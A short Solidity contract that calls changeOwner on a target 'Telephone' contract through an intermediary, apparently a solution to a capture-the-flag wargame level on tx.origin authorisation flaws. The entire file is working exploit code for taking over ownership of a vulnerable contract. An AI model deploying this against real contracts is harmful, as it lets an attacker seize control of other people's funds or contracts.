// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneCaller {
    function ring(address telephone) public {
        ITelephone(telephone).changeOwner(msg.sender);
    }
}

interface ITelephone {
    function changeOwner(address _owner) external;
}